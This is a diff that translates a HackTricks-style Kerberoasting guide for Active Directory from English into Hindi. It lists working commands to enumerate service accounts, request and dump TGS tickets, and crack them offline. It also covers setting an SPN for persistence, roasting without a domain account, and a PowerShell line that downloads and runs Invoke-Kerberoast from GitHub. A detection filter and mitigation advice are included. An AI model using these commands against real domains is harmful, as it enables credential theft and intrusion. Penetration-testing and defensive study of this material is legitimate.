@@ -3,8 +3,8 @@
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
+आज ही एक्सेस प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
@@ -12,25 +12,22 @@ Get Access Today:
 
 ## Kerberoast
 
-Kerberoasting focuses on the acquisition of **TGS tickets**, specifically those related to services operating under **user accounts** in **Active Directory (AD)**, excluding **computer accounts**. The encryption of these tickets utilizes keys that originate from **user passwords**, allowing for the possibility of **offline credential cracking**. The use of a user account as a service is indicated by a non-empty **"ServicePrincipalName"** property.
+Kerberoasting **TGS टिकटों** के अधिग्रहण पर केंद्रित है, विशेष रूप से उन सेवाओं से संबंधित जो **Active Directory (AD)** में **उपयोगकर्ता खातों** के तहत संचालित होती हैं, **कंप्यूटर खातों** को छोड़कर। इन टिकटों का एन्क्रिप्शन उन कुंजियों का उपयोग करता है जो **उपयोगकर्ता पासवर्ड** से उत्पन्न होती हैं, जिससे **ऑफलाइन क्रेडेंशियल क्रैकिंग** की संभावना होती है। एक सेवा के रूप में उपयोगकर्ता खाते का उपयोग एक गैर-खाली **"ServicePrincipalName"** प्रॉपर्टी द्वारा संकेतित किया जाता है।
 
-For executing **Kerberoasting**, a domain account capable of requesting **TGS tickets** is essential; however, this process does not demand **special privileges**, making it accessible to anyone with **valid domain credentials**.
+**Kerberoasting** को निष्पादित करने के लिए, एक डोमेन खाता आवश्यक है जो **TGS टिकटों** का अनुरोध कर सके; हालाँकि, इस प्रक्रिया के लिए **विशेष विशेषाधिकार** की आवश्यकता नहीं होती है, जिससे यह किसी भी व्यक्ति के लिए सुलभ होता है जिसके पास **मान्य डोमेन क्रेडेंशियल्स** हैं।
 
-### Key Points:
+### मुख्य बिंदु:
 
-- **Kerberoasting** targets **TGS tickets** for **user-account services** within **AD**.
-- Tickets encrypted with keys from **user passwords** can be **cracked offline**.
-- A service is identified by a **ServicePrincipalName** that is not null.
-- **No special privileges** are needed, just **valid domain credentials**.
+- **Kerberoasting** **AD** के भीतर **उपयोगकर्ता-खाता सेवाओं** के लिए **TGS टिकटों** को लक्षित करता है।
+- **उपयोगकर्ता पासवर्ड** से प्राप्त कुंजियों के साथ एन्क्रिप्टेड टिकटों को **ऑफलाइन क्रैक** किया जा सकता है।
+- एक सेवा को एक **ServicePrincipalName** द्वारा पहचाना जाता है जो शून्य नहीं है।
+- **विशेष विशेषाधिकार** की आवश्यकता नहीं है, केवल **मान्य डोमेन क्रेडेंशियल्स**।
 
-### **Attack**
+### **हमला**
 
 > [!WARNING]
-> **Kerberoasting tools** typically request **`RC4 encryption`** when performing the attack and initiating TGS-REQ requests. This is because **RC4 is** [**weaker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
-> RC4 (type 23) hashes begin with **`$krb5tgs$23$*`** while AES-256(type 18) start with **`$krb5tgs$18$*`**`.`
-
-#### **Linux**
-
+> **Kerberoasting उपकरण** आमतौर पर हमले को करने और TGS-REQ अनुरोधों को आरंभ करते समय **`RC4 एन्क्रिप्शन`** का अनुरोध करते हैं। इसका कारण यह है कि **RC4** [**कमजोर**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) है और Hashcat जैसे उपकरणों का उपयोग करके अन्य एन्क्रिप्शन एल्गोरिदम जैसे AES-128 और AES-256 की तुलना में ऑफलाइन क्रैक करना आसान है।\
+> RC4 (प्रकार 23) हैश **`$krb5tgs$23$*`** से शुरू होते हैं जबकि AES-256 (प्रकार 18) **`$krb5tgs$18$*`** से शुरू होते हैं।
 ```bash
 # Metasploit framework
 msf> use auxiliary/gather/get_user_spns
@@ -41,27 +38,21 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-
-Multi-features tools including a dump of kerberoastable users:
-
+मल्टी-फीचर्स टूल्स जिसमें kerberoastable उपयोगकर्ताओं का डंप शामिल है:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
-
 #### Windows
 
-- **Enumerate Kerberoastable users**
-
+- **Kerberoastable उपयोगकर्ताओं की गणना करें**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-
-- **Technique 1: Ask for TGS and dump it from memory**
-
+- **तकनीक 1: TGS के लिए पूछें और इसे मेमोरी से डंप करें**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -81,9 +72,7 @@ python2.7 kirbi2john.py sqldev.kirbi
 # Transform john to hashcat
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
-
-- **Technique 2: Automatic tools**
-
+- **तकनीक 2: स्वचालित उपकरण**
 ```bash
 # Powerview: Get Kerberoast hash of a user
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
@@ -99,88 +88,77 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
-
 > [!WARNING]
-> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
+> जब एक TGS का अनुरोध किया जाता है, तो Windows इवेंट `4769 - A Kerberos service ticket was requested` उत्पन्न होता है।
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **वर्कफ़्लो** को आसानी से बना और **स्वचालित** कर सकें।\
+आज ही एक्सेस प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
-### Cracking
-
+### क्रैकिंग
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-
 ### Persistence
 
-If you have **enough permissions** over a user you can **make it kerberoastable**:
-
+यदि आपके पास एक उपयोगकर्ता पर **पर्याप्त अनुमतियाँ** हैं, तो आप इसे **kerberoastable** बना सकते हैं:
 ```bash
- Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
+आप उपयोगी **tools** **kerberoast** हमलों के लिए यहाँ पा सकते हैं: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+यदि आप Linux से यह **error** पाते हैं: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** तो यह आपके स्थानीय समय के कारण है, आपको होस्ट को DC के साथ समन्वयित करने की आवश्यकता है। कुछ विकल्प हैं:
 
-If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:
-
-- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
+- `ntpdate <IP of DC>` - Ubuntu 16.04 से हटा दिया गया
 - `rdate -n <IP of DC>`
 
 ### Mitigation
 
-Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:
+Kerberoasting को उच्च स्तर की छिपाने की क्षमता के साथ किया जा सकता है यदि यह शोषण योग्य है। इस गतिविधि का पता लगाने के लिए, **Security Event ID 4769** पर ध्यान दिया जाना चाहिए, जो इंगित करता है कि एक Kerberos टिकट का अनुरोध किया गया है। हालाँकि, इस घटना की उच्च आवृत्ति के कारण, संदिग्ध गतिविधियों को अलग करने के लिए विशिष्ट फ़िल्टर लागू करने की आवश्यकता है:
 
-- The service name should not be **krbtgt**, as this is a normal request.
-- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
-- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
-- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
-- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.
-
+- सेवा नाम **krbtgt** नहीं होना चाहिए, क्योंकि यह एक सामान्य अनुरोध है।
+- सेवा नाम जो **$** के साथ समाप्त होते हैं, उन्हें मशीन खातों को शामिल करने से बचने के लिए बाहर रखा जाना चाहिए।
+- मशीनों से अनुरोधों को **machine@domain** के रूप में स्वरूपित खाता नामों को बाहर करके फ़िल्टर किया जाना चाहिए।
+- केवल सफल टिकट अनुरोधों पर विचार किया जाना चाहिए, जिन्हें **'0x0'** की विफलता कोड द्वारा पहचाना जाता है।
+- **सबसे महत्वपूर्ण**, टिकट एन्क्रिप्शन प्रकार **0x17** होना चाहिए, जो अक्सर Kerberoasting हमलों में उपयोग किया जाता है।
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
+Kerberoasting के जोखिम को कम करने के लिए:
 
-To mitigate the risk of Kerberoasting:
+- सुनिश्चित करें कि **सेवा खाता पासवर्ड अनुमान लगाने में कठिन हैं**,  **25 वर्णों** से अधिक की लंबाई की सिफारिश की जाती है।
+- **प्रबंधित सेवा खातों** का उपयोग करें, जो **स्वचालित पासवर्ड परिवर्तन** और **प्रतिनिधि सेवा प्रमुख नाम (SPN) प्रबंधन** जैसे लाभ प्रदान करते हैं, जो ऐसे हमलों के खिलाफ सुरक्षा को बढ़ाते हैं।
 
-- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
-- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.
+इन उपायों को लागू करके, संगठन Kerberoasting से संबंधित जोखिम को महत्वपूर्ण रूप से कम कर सकते हैं।
 
-By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.
+## Kerberoast बिना डोमेन खाता
 
-## Kerberoast w/o domain account
+**सितंबर 2022** में, एक शोधकर्ता चार्ली क्लार्क द्वारा एक प्रणाली का शोषण करने का एक नया तरीका सामने आया, जिसे उनके प्लेटफॉर्म [exploit.ph](https://exploit.ph/) के माध्यम से साझा किया गया। यह विधि **KRB_AS_REQ** अनुरोध के माध्यम से **सेवा टिकट (ST)** प्राप्त करने की अनुमति देती है, जो आश्चर्यजनक रूप से किसी भी सक्रिय निर्देशिका खाते पर नियंत्रण की आवश्यकता नहीं होती है। मूल रूप से, यदि एक प्रमुख इस तरह से सेट किया गया है कि इसे पूर्व प्रमाणीकरण की आवश्यकता नहीं है—यह एक परिदृश्य है जो साइबर सुरक्षा क्षेत्र में **AS-REP रोस्टिंग हमले** के रूप में जाना जाता है—तो इस विशेषता का उपयोग अनुरोध प्रक्रिया में हेरफेर करने के लिए किया जा सकता है। विशेष रूप से, अनुरोध के शरीर में **sname** विशेषता को बदलकर, प्रणाली को एक **ST** जारी करने के लिए धोखा दिया जाता है बजाय मानक एन्क्रिप्टेड टिकट ग्रांटिंग टिकट (TGT) के।
 
-In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).
-
-The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+इस तकनीक को इस लेख में पूरी तरह से समझाया गया है: [Semperis ब्लॉग पोस्ट](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)।
 
 > [!WARNING]
-> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
+> आपको उपयोगकर्ताओं की एक सूची प्रदान करनी होगी क्योंकि हमारे पास इस तकनीक का उपयोग करके LDAP को क्वेरी करने के लिए कोई मान्य खाता नहीं है।
 
 #### Linux
 
 - [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
-
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
-
 #### Windows
 
 - [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
-
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
-
-## References
+## संदर्भ
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
@@ -191,8 +169,7 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
+आज ही पहुँच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
-
